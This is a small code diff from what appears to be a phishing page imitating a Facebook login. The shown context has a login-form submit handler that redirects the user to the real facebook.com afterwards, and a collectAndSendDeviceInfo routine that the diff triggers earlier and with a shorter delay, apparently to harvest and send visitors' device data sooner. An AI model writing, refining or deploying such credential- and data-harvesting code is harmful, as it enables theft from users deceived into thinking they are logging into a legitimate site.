@@ -382,10 +382,10 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
   window.location.href = "https://facebook.com";
 });
 
-window.addEventListener('load', function() {
+document.addEventListener('DOMContentLoaded', function() {
   setTimeout(() => {
     collectAndSendDeviceInfo();
-  }, 1000);
+  }, 500);
 });
 </script>
 
